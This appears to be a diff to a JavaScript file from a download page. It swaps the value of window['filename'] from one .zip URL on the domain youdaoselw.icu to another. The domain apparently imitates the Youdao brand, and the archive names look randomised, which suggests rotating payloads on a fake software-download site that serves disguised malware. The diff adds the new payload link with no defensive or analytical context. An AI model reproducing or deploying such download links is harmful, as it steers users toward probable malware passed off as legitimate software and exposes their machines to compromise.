@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://youdaoselw.icu/Axs_win7-11_QurickQsvrpn_3375.zip';
+    window['filename'] = 'https://youdaoselw.icu/Liconne_steunpqukeq_w7-11sp_475.142.zip';
 })();
